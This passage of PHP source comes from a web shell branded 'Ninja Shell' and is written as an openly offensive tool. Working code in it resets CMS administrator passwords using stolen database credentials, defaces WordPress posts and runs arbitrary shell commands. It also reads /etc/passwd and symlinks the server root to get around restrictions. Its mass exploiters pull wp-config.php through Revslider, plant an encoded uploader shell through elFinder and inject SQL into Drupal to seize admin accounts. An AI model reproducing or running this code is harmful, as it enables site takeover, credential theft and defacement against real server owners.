							$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => Wordpress<br>";
							print $url_target;
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						} elseif (preg_match("/Magento|Mage_Core/", $config)) {
							$dbhost = getValue($config, "<host><![CDATA[", "]]></host>");
							$dbuser = getValue($config, "<username><![CDATA[", "]]></username>");
							$dbpass = getValue($config, "<password><![CDATA[", "]]></password>");
							$dbname = getValue($config, "<dbname><![CDATA[", "]]></dbname>");
							$dbprefix = getValue($config, "<table_prefix><![CDATA[", "]]></table_prefix>");
							$prefix = $dbprefix . "admin_user";
							$option = $dbprefix . "core_config_data";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
							$result = mysql_fetch_array($q);
							$id = $result[user_id];
							$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
							$result2 = mysql_fetch_array($q2);
							$target = $result2[value];
							if ($target == '') {
								$url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
							} else {
								$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
							}
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => Magento<br>";
							print $url_target;
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						} elseif (preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $config)) {
							$dbhost = getValue($config, "'DB_HOSTNAME', '", "'");
							$dbuser = getValue($config, "'DB_USERNAME', '", "'");
							$dbpass = getValue($config, "'DB_PASSWORD', '", "'");
							$dbname = getValue($config, "'DB_DATABASE', '", "'");
							$dbprefix = getValue($config, "'DB_PREFIX', '", "'");
							$prefix = $dbprefix . "user";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
							$result = mysql_fetch_array($q);
							$id = $result[user_id];
							$target = getValue($config, "HTTP_SERVER', '", "'");
							if ($target == '') {
								$url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
							} else {
								$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
							}
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => OpenCart<br>";
							print $url_target;
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						} elseif (preg_match("/panggil fungsi validasi xss dan injection/", $config)) {
							$dbhost = getValue($config, 'server = "', '"');
							$dbuser = getValue($config, 'username = "', '"');
							$dbpass = getValue($config, 'password = "', '"');
							$dbname = getValue($config, 'database = "', '"');
							$prefix = "users";
							$option = "identitas";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
							$result = mysql_fetch_array($q);
							$target = $result[alamat_website];
							if ($target == '') {
								$target2 = $result[url];
								$url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
								if ($target2 == '') {
									$url_target2 = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
								} else {
									$cek_login3 = file_get_contents("$target2/adminweb/");
									$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
									if (preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
										$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
									} elseif (preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
										$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
									} else {
										$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
									}
								}
							} else {
								$cek_login = file_get_contents("$target/adminweb/");
								$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
								if (preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
									$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
								} elseif (preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
									$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
								} else {
									$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
								}
							}
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => Lokomedia<br>";
							if (preg_match("/Can't get domain name/", $url_target)) {
								print $url_target2;
							} else {
								print $url_target;
							}
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						}
					}
				}
			} else {
				print "<center>
				<h2>Mass User Changer Ninja Shell</h2>
				<form method='post'>
				<input type='radio' name='config_type' value='dir' checked>DIR Config <input type='radio' name='config_type' value='link'>LINK Config<br><br>

				<input type='text' size='50' name='config_dir' style='width:250px;' height = '10' class='form-control' value='" . path() . "'><br><br>
				Set User & Pass: <br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='user_baru' value='Exorcism1337' placeholder='user_baru'><br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='pass_baru' value='Exorcism1337' placeholder='pass_baru'><br>
				<input class = 'form-control' style='width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
				</form></center><hr><br>";
			}
		} elseif (isset($_GET[hex('mass_title')])) {
			echo "<hr><br><center><h2>Mass Title Changer Ninja Shell</h2>
<form method='post'>
Link Config: <br>
<input type='text' class = 'form-control' height='10' name='linkconf' height='10' style='width: 450px;' placeholder='http://website.com/ia_symconf/'><br><br>
<input type='submit' class = 'form-control' height='10' style='width: 450px;' name='gass' value='Hajar!!' class='oke'>
</form></center><hr><br>";
			if ($_POST['gass']) {
				echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";
				GrabUrl($_POST['linkconf'], 'wordpress');
				echo "</textarea><br>ID: <input class = 'form-control'  type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By Index_Attacker'><br>POST CONTENT: <input type='text' name='content' value='Hacked By Index_Attacker'><br>POSTNAME: <input type='text' name='postname' value='HackeD By Index_Attacker'><br>
<input type='submit' style='width: 450px;' name='edittitle' value='Hajar!!'>
</form></center>";
			}
			if ($_POST['edittitle']) {
				$title = htmlspecialchars($_POST['title']);
				$id = $_POST['id'];
				$content = $_POST['content'];
				$postname = $_POST['name'];
				function anucurl($sites)
				{
					$ch = curl_init($sites);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
					curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
					curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
					curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data = curl_exec($ch);
					curl_close($ch);
					return $data;
				}
				$link = explode("\r\n", $_POST['link']);
				foreach ($link as $dir_config) {
					$config = anucurl($dir_config);
					$dbhost = ambilkata($config, "DB_HOST', '", "'");
					$dbuser = ambilkata($config, "DB_USER', '", "'");
					$dbpass = ambilkata($config, "DB_PASSWORD', '", "'");
					$dbname = ambilkata($config, "DB_NAME', '", "'");
					$dbprefix = ambilkata($config, "table_prefix  = '", "'");
					$prefix = $dbprefix . "posts";
					$option = $dbprefix . "options";
					$conn = mysql_connect($dbhost, $dbuser, $dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
					$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
					echo "<div style='margin: 5px auto;'>";
					if ($target == '') {
						echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
					} else {
						echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
					}
					if (!$update or !$conn or !$db) {
						echo "<font color=red>MySQL Error: " . mysql_error() . "</font><br>";
					} else {
						echo "<font color=lime>sukses di ganti.</font><br>";
					}
					echo "</div>";
					mysql_close($conn);
				}
			}
		} elseif (isset($_GET[hex('bypass')])) {
			echo "<hr><br>";
			echo "<center><h2>Bypasser Ninja Shell</h2></center><br>";
			echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('bypass-cf') . "' style='width: 250px;' height='10'><center>Bypass CloudFlare</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('bypass-server') . "' style='width: 250px;' height='10'><center>Bypass Server</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('bypass-vhost') . "' style='width: 250px;' height='10'><center>Bypass Vhost</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('bypass-passwd') . "' style='width: 250px;' height='10'><center>Bypass Passwd</center></a>
						</div>
						</div></form>";
			echo "<hr>";
		} elseif (isset($_GET[hex('bypass-cf')])) {
			echo '
				
				<form method="POST"><br><br><center><hr>
				<h2>Bypass CloudFlare Ninja Shell</h2>
				<div class = "row clearfix">
				<div class= "col-md-4">
				<select class="form-control" name="krz">
					<option>ftp</option>
						<option>direct-conntect</option>
							<option>webmail</option>
								<option>cpanel</option>
				</select>
				</div>
				<div class = "col-md-4">
				<input class="form-control" type="text" name="target" value="url">
				</div>
				<div class = "col-md-4">
				<input class="form-control" type="submit" value="Bypass">
				</div>
				</div>
				</center>
				<hr><br>
				</form>
				

				';

			$target = $_POST['target'];
			# Bypass From FTP
			if ($_POST['krz'] == "ftp") {
				$ftp = gethostbyname("ftp." . "$target");
				echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
			}
			# Bypass From Direct-Connect
			if ($_POST['krz'] == "direct-conntect") {
				$direct = gethostbyname("direct-connect." . "$target");
				echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
			}
			# Bypass From Webmail
			if ($_POST['krz'] == "webmail") {
				$web = gethostbyname("webmail." . "$target");
				echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
			}
			# Bypass From Cpanel
			if ($_POST['krz'] == "cpanel") {
				$cpanel = gethostbyname("cpanel." . "$target");
				echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
			}
		} elseif (isset($_GET[hex('bypass-server')])) {
			$dir = path();
		?>
			<form action="?dir=<?php echo $dir; ?>&amp;do=bypassserver" method="post">
				<center /><br />
				<hr>
				<h2>Bypass Server Ninja Shell</h2><br>
				<?php
				print '
<form method="POST" action=""><br><center>
<b><font color=white><b><font color="black">Command </font></font></b>
<div class = "col-md-4">
<input name="baba" type="text" class="form-control" style="width:250px;" size="34">&nbsp;
</div>
<div class = "col-md-4">
<input type="submit" class="form-control" value="Execute!" style="width:350px;">
<br>
</div>
</form>
<form method="POST" action=""><strong><b><font color="black">Menu Bypass</font></strong>
<select name="liz0" size="1" class="form-control" style="width:250px;">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <br><input type="submit" class="form-control" style="width:350px;" value="Bypass!">
</form>
<hr><br></center>
';
				ini_restore("safe_mode");
				ini_restore("open_basedir");
				$liz0 = shell_exec($_POST[baba]);
				$liz0zim = shell_exec($_POST[liz0]);
				$uid = shell_exec('id');
				$server = shell_exec('uname -a');
				echo "<pre><h4>";

				echo $liz0;
				echo $liz0zim;
				echo "</h4></pre>";
				"</div>";
				?>
			<?php
		} elseif (isset($_GET[hex('bypass-vhost')])) {
			echo "<hr><form method='POST' action=''>";
			echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
			echo "<center><input type='submit' value='Bypass it' name='Colii' class = 'form-control' style='width:250px;'></center>";
			if (isset($_POST['Colii'])) {
				system('ln -s / Exorcism1337.txt');
				$fvckem = 'T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
				$file = fopen(".htaccess", "w+");
				$write = fwrite($file, base64_decode($fvckem));
				$Bok3p = symlink("/", "Exorcism1337.txt");
				$rt = "<br><a href=Exorcism1337.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";
				echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";
			}
			echo "</form><hr><br>";
		} elseif (isset($_GET[hex('bypass-passwd')])) {
			echo '<hr><center><h2>Bypass Etc/Passwd </h2><br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" class = "form-control" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" class = "form-control" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" class = "form-control" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>
<br><hr>
<h2>Bypass User</h2><table style="width:50%"><br>
<tr>
    <td><form method="post"><input type="submit" class = "form-control" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" class = "form-control" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" class = "form-control" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br><hr>';


			if ($_POST['awkuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
				echo "</textarea><br>";
			}
			if ($_POST['systuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo system("ls /var/mail");
				echo "</textarea><br>";
			}
			if ($_POST['passthuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo passthru("ls /var/mail");
				echo "</textarea><br>";
			}
			if ($_POST['exuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo exec("ls /var/mail");
				echo "</textarea><br>";
			}
			if ($_POST['shexuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo shell_exec("ls /var/mail");
				echo "</textarea><br>";
			}
			if ($_POST['syst']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo system("cat /etc/passwd");
				echo "</textarea><br><br><b></b><br>";
			}
			if ($_POST['passth']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo passthru("cat /etc/passwd");
				echo "</textarea><br><br><b></b><br>";
			}
			if ($_POST['ex']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo exec("cat /etc/passwd");
				echo "</textarea><br><br><b></b><br>";
			}
			if ($_POST['shex']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo shell_exec("cat /etc/passwd");
				echo "</textarea><br><br><b></b><br>";
			}
			echo '<center>';
			if ($_POST['melex']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				for ($uid = 0; $uid < 60000; $uid++) {
					$ara = posix_getpwuid($uid);
					if (!empty($ara)) {
						while (list($key, $val) = each($ara)) {
							print "$val:";
						}
						print "\n";
					}
				}
				echo "</textarea><br><br>";
			}
		} elseif (isset($_GET[hex('exploiter')])) {
			echo "<hr><br>";
			echo "<center><h2>Exploiter Ninja Shell</h2></center><br>";
			echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('csrf') . "' style='width: 250px;' height='10'><center>CSRF Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('revslider') . "' style='width: 250px;' height='10'><center>Revslider Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('elfinder') . "' style='width: 250px;' height='10'><center>Elfinder Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('drupal') . "' style='width: 250px;' height='10'><center>Drupal Exploiter</center></a>
						</div>
						
						</div>
						
						</form>";
			echo "<hr>";
		} elseif (isset($_GET[hex('csrf')])) {

			echo '
<hr><br><center><h2 style="font-size:33px;">CSRF Exploiter Ninja Shell</h2><br><br>
<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
<br><br>
<form method="POST" style="font-size:25px;" action= "">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px; width:450px;" class = "form-control" required autocomplete = "off"><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px; width:250px;" required class = "form-control" autocomplete = "off"><br>
<input style="width:350px;" type="submit" name="d" value="Lock!" class = "form-control">
</form><hr><br>';
			$url = $_POST["url"];
			$pf = $_POST["pf"];
			$d = $_POST["d"];
			if ($d) {
				echo "
	<h2>Upload Your Files</h2>
	<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form>";
			}
		} elseif (isset($_GET[hex('revslider')])) {

			echo "
     
<center><hr><br>
<h2>Revslider Exploiter Ninja Shell</h2>
<form method='post'>
<textarea class='form-control' name='site' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='form-control' type='submit' style='width: 150px;' name='sikat' value='Gass!'>
</form></center><hr><br>
";
			function findit($mytext, $starttag, $endtag)
			{
				$posLeft = stripos($mytext, $starttag) + strlen($starttag);
				$posRight = stripos($mytext, $endtag, $posLeft + 1);
				return substr($mytext, $posLeft, $posRight - $posLeft);
			}
			error_reporting(0);
			set_time_limit(0);
			$ya = $_POST['sikat'];
			$co = $_POST['site'];
			if ($ya) {
				$e = explode("
", $co);
				foreach ($e as $bda) {
					//echo '<br>'.$bda;
					$linkof = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
					$dn = ($bda) . ($linkof);
					$file = @file_get_contents($dn);
					if (eregi('DB_HOST', $file) and !eregi('FTP_USER', $file)) {
						echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
						echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
						echo "<font face='courier' color=lime >DB name : </font>" . findit($file, "DB_NAME', '", "');") . "<br>";
						echo "<font face='courier' color=lime >DB user : </font>" . findit($file, "DB_USER', '", "');") . "<br>";
						echo "<font face='courier' color=lime >DB pass : </font>" . findit($file, "DB_PASSWORD', '", "');") . "<br>";
						echo "<font face='courier' color=lime >DB host : </font>" . findit($file, "DB_HOST', '", "');") . "<br>";
					} elseif (eregi('DB_HOST', $file) and eregi('FTP_USER', $file)) {
						echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
						echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
						echo "<font face='courier' color=lime >FTP user : </font>" . findit($file, "FTP_USER','", "');") . "<br>";
						echo "<font face='courier' color=lime >FTP pass : </font>" . findit($file, "FTP_PASS','", "');") . "<br>";
						echo "<font face='courier' color=lime >FTP host : </font>" . findit($file, "FTP_HOST','", "');") . "<br>";
					} else {
						echo "<center><font face='courier' color='red' >" . $bda . " ----> not infected </font></center>";
					}
					echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
				}
			}
		} elseif (isset($_GET[hex('elfinder')])) {

			echo "<hr><br>";
			echo "<center>";
			echo '<h2>ElFinder Mass Exploiter</h2>';
			echo '<form method="post">
Target: <br>
<textarea class = "form-control" name="target" placeholder="http://www.target.com/elFinder/php/connector.php" style="width: 600px; height: 250px; margin: 5px auto; resize:
none;"></textarea><br>
<input class = "form-control" type="submit" name="x" style="width: 150px; height: 35px; margin: 5px;" value="SIKAT!">
</form></center><hr><br>';
			function ngirim($url, $isi)
			{
				$ch = curl_init("$url");
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
				curl_setopt($ch, CURLOPT_COOKIEJAR, 'coker_log');
				curl_setopt($ch, CURLOPT_COOKIEFILE, 'coker_log');
				$data3 = curl_exec($ch);
				return $data3;
			}
			$target = explode("
", $_POST['target']);
			if ($_POST['x']) {
				foreach ($target as $korban) {
					$nama_doang = "Exorcism1337.php";
					$isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1
lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
					$decode_isi = base64_decode($isi_nama_doang);
					$encode = base64_encode($nama_doang);
					$fp = fopen($nama_doang, "w");
					fputs($fp, $decode_isi);
					echo "[!] <a href='$korban' target='_blank'>$korban</a> <br>";
					echo "# Upload[1] ......<br>";
					$url_mkfile = "$korban?cmd=mkfile&name=$nama_doang&target=l1_Lw";
					$b = file_get_contents("$url_mkfile");
					$post1 = array("cmd" => "put", "target" => "l1_$encode", "content" => "$decode_isi",);
					$post2 = array("current" => "8ea8853cb93f2f9781e0bf6e857015ea", "upload[]" => "@$nama_doang",);
					$output_mkfile = ngirim("$korban", $post1);
					if (preg_match("/$nama_doang/", $output_mkfile)) {
						echo "<font color='lime'># Upload Sukses 1... => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
					} else {
						echo "<font color='red'># Upload Gagal Cok! 1 <br># Uploading 2..</font><br>";
						$upload_ah = ngirim("$korban?cmd=upload", $post2);
						if (preg_match("/$nama_doang/", $upload_ah)) {
							echo "<font color='lime'># Upload Sukses 2 => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
						} else {
							echo "<font color='red'># Upload Gagal Lagi Cok! 2</font><br><br>";
						}
					}
				}
			}
		} elseif (isset($_GET[hex('drupal')])) {

			echo "<center><hr><br>";
			echo "
		<h2>Drupal Mass Exploiter</h2><br>
		<form method='post' action=''>
		<textarea rows='10'class='form-control' cols='10' name='url'>
		http://www.site.com
		http://www.site2.com</textarea><br><br>
		<input type='submit' class='form-control' style='width:250px;' name='submit' value='SIKAT!'>
		</form></center><hr><br>
		";
			$drupal = ($_GET["drupal"]);
			if ($drupal == 'drupal') {
				$filename = $_FILES['file']['name'];
				$filetmp = $_FILES['file']['tmp_name'];
				echo "<div class='mybox'><form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form></div>";
				move_uploaded_file($filetmp, $filename);
			}
			error_reporting(0);
			if (isset($_POST['submit'])) {
				function exploit($url)
				{
					$post_data = "name[0;update users set name %3D 'Exorcism' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
					$params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
					$ctx = stream_context_create($params);
					$data = file_get_contents($url . '/user/login/', null, $ctx);
					if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
						$fp = fopen("exploited.txt", 'a+');
						fwrite($fp, "Exploitied  User: Exorcism Pass: Exorcism  =====> {$url}/user/login");
						fwrite($fp, "
");
						fwrite($fp, "--------------------------------------------------------------------------------------------------");
						fwrite($fp, "
");
						fclose($fp);
						echo "<font color='lime'><b>Success:<font color='white'>Exorcism</font> Pass:<font color='white'>Exorcism</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
					} else {
						echo "<font color='red'><b>Failed => {$url}/user/login</font></b><br>";
					}
				}
				$urls = explode("
", $_POST['url']);
				foreach ($urls as $url) {
					$url = @trim($url);
					echo exploit($url);
				}
			}
		} elseif (isset($_GET[hex('auto_tools')])) {

			echo '<hr><center><h2>Auto Tools Ninja Shell </h2><br>
<table style="width:90%">
  <tr>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("zone-h") . '><center>Zone H</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("defacer-id") . '><center>Defacer ID</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("jumping") . '><center>Jumping</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("fake-root") . '><center>Fake Root</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("adminer") . '><center>Adminer</center></a></td>
</tr>
<tr>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("wp-hijack") . '><center>Wp Auto Hijack</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("cpanel-reset") . '><center>Cpanel Reset</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("zip-menu") . '><center>Zip Menu</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("reverse-ip") . '><center>Reverse IP</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("rdp") . '><center>K-RDP Shell</center></a></td>
</tr>
<tr>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("ransomware") . '><center>Ransomware</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("whois") . '><center>WhoIs</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("phpinfo") . '><center>Php Info</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("inject-code") . '><center>Inject Code</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("db-dump") . '><center>DB Dump</center></a></td>
</tr>
<tr>
